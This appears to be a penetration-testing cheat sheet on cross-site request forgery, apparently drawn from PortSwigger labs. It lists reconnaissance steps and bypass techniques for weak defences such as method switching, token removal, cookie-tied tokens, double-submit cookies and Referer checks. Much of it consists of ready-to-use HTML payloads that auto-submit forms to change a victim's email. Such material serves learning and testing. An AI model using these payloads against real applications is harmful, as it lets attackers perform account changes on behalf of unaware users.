# Cross-site Request Forgery (CSRF)

## Summary

* [Recon for CSRF](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

## Recon

### Identify Potential CSRF Vectors

* Identify an application function that can be used to perform some sensitive action on behalf of another user without their knowledge, that relies solely on cookies for tracking user sessions, and that contains request parameters that an attacker can fully determine in advance.

* Some examples of sensitive actions can be changing email address, password, shipping address, transferring funds, etc.

* Create an HTML page that performs the request without user interaction.  For GET requests, we can place the vulnerable URL inside of an <img> tag within a src attribute.  For POST requests, we can create a form that contains all the required parameters and issues a request to the vulnerable URL.  JavaScript can then be used to automatically submit the form when the page loads.

* While we have an authenticated session on the application, we can load this HTML page in the same browser to confirm if the request was processed successfully.



### Example Payload:  CSRF attack with GET request

* We can use the “src” attribute within an \<img\> tag to craft the CSRF exploit, or we can simply just use a stand-alone URL.

```html
<html>
<img src="https://VULNERABLE-APPLICATION.net/my-account/change-email?email=TestCSRF%40Test.com" >
</html>
```


### Example Payload:  CSRF attack with POST request

* We need to create a form that contains all the required parameters to submit the request successfully.

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

---
---


## Cheat Sheet

### No CSRF Protections

* When no CSRF protections are in place in a state-changing request, we can create an appropriate HTML page that will submit a request to the vulnerable application.

    * Payloads for CSRF GET requests can be a self-contained attack within a URL.  An attacker does not need to host the exploit code in their server.  They just need to send the malicious link to the victim user via social engineering techniques.
    
    * Payloads for CSRF POST requests, we need to create a form with all the data needed to process the request successfully.  An attacker needs to host this code somewhere and send a link of that malicious site, to the victim user. The browser will automatically add the Authenticated Session Cookie(s) to the request, when the user clicks on the link.


### CSRF Protection Bypass - HTTP Method Change

* When the application is using a CSRF Token in a body parameter of a POST request, change the HTTP request method to GET and leave out the CSRF Token parameter.  This can potentially bypass the CSRF defense put in place.  This can happen due to frameworks only implementing CSRF protection on state-changing requests, and state-changing requests should only be done with POST method not GET.


### CSRF Protection Bypass - Remove CSRF Parameter/Value

* When the application uses a CSRF Token as header/parameter, remove the entire CSRF Token parameter and value to potentially bypass this CSRF protection.


### CSRF Protection Bypass – CSRF Token Not Tied to User Session

* CSRF Tokens may not be tied to the user’s session.  The application may just be keeping a pool of valid tokens and if the submitted request contains one of these tokens, then the request will be processed successfully.  An attacker can log into the application, obtain a valid token and use this CSRF token when attacking other users via a CSRF attack.


### CSRF Protection Bypass – CSRF Token Tied to an Arbitrary Cookie

* The CSRF Token may be tied to an arbitrary Cookie.  If the application contains some functionality that allows us to set a cookie in the victim’s browser, we may be able to bypass this protection.  

* The attacker needs to log into the application, obtain a valid CSRF Token and the Cookie that it is mapped too.  Then create a crafted CSRF exploit that will set the known Cookie in the victim’s browser then submit the POST request with the necessary parameters, which should include the known CSRF Token.

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="hidden" name="csrf" value="iH07e8eJkWw" />
      <input type="submit" value="Submit request" />
    </form>

    <img src="$cookie-injection-url" onerror="document.forms[0].submit()">
  </body>
</html>
```


### CSRF Protection Bypass – Double Submit Cookie Method

* Application was using a double submit cookie for CSRF protection.  There was a CSRF Cookie and a CSRF Token parameter in the state-changing request.  These 2 values contained the exact same data; the application will process the request successfully if those 2 values are equal.

* If the application contains some functionality that allows us to set a cookie in the victim’s browser, we may be able to bypass this protection.  By crafting a payload that will set a cookie in the victim’s browser and supplying the same value as the CSRF Token parameter in the HTML form.


```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="hidden" name="csrf" value="iH07e8eJkWw" />
      <input type="submit" value="Submit request" />
    </form>

    <img src="$cookie-injection-url" onerror="document.forms[0].submit()">
  </body>
</html>
```


### CSRF Protection Bypass - Referer Header Validation Bypass

* If the application is using the Referer header for protection against CSRF, remove the header/value completely and review if the request was processed successfully.  If the request was still successful, we can craft an HTML form that includes some attributes that will cause the browser to drop the “Referer” header with the request.  This will bypass the “protection” in place.


```html
<html>
    <meta name="referrer" content="never">
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```


### CSRF Protection Bypass – Referer Header Validation Bypass

* The application was using the Referer header to defend against CSRF attacks.  The application was only checking to see if a specific domain value was somewhere within the “Referer” header.

* This validation can be easily bypassed by submitting a payload that will inject the required domain value as a query parameter in the “Referer” header.   Which will bypass this restriction, as the application is only checking if the value is somewhere in the header.


```html
<html>
    <meta name="referrer" content="unsafe-url">
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/?REQUIRED-REFERER-VALUE')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```